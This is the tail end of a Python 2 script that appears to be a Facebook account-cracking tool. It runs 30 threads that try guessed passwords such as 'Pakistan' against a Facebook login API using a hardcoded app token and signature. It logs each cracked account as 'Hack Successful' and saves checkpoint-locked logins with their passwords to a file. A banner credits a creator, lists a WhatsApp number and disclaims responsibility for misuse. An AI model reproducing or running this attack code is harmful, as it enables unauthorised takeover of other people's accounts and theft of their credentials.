													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
        
														print '\x1b[1;96m[\x1b[1;20mHack Successful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;58m|\x1b[1;97m ' + pass6
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
      
															print '\x1b[1;96m[\x1b[1;93mAfter7days\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;58m|\x1b[1;97m ' + pass6
															cek = open("out/checkpoint.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
															b = json.loads(a.text)
															pass7 = 'Pakistan'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
       
																print '\x1b[1;96m[\x1b[1;20mHack Successful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;58m|\x1b[1;97m ' + pass7
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
        
																	print '\x1b[1;96m[\x1b[1;93mAfter7days\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;58m|\x1b[1;97m ' + pass7
																	cek = open("out/checkpoint.txt", "a")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
        print "\033[1;98m🔀 ⚌⚌⚌⚍⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌ 🔀"
	print '\033[1;93mProcess Has Been Completed'
	print"\033[1;91mTotal OK/\x1b[1;95mCP \033[1;93m: \033[1;91m"+str(len(oks))+"\033[1;93m/\033[1;96m"+str(len(cekpoint))
	print """
\033[1;96m❋❈╭┳✪✪╤──────────────────────────────────────➛➢
\033[1;96m♚♚║\033[1;32mCREATOR  : \033[1;32mSHAZAHN
\033[1;96m♚♚║\033[1;32mwhatsapp  : \033[1;33mWhatsapp 01931192399
\033[1;96m♚♚║\033[1;32mWARNING  : \033[1;32mI M NOT RESPONSIBLE FOR ANY MISS USE
\033[1;96m❋❈╰┻✪✪╧─────────────────────────────────────➛➢
  
  
  \033[1;95mTHANK YOU FOR USING OUR TOOL
\033[1;95mCHECKPOINT ACCOUNT AFTER 7 DAYS
  \033[1;95mI M NOT RESPONSIBLE FOR ANY MISS USE AUTHOR SHAZAHN 
\033[1;95m  HOWLADEAR 
\033[1;98m🔀 ⚌⚌⚌⚍⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌ 🔀   """
	
	raw_input("\n\033[1;95m[\033[1;91mBack\033[1;95m]")
	menu()

if __name__ == '__main__':
	login()
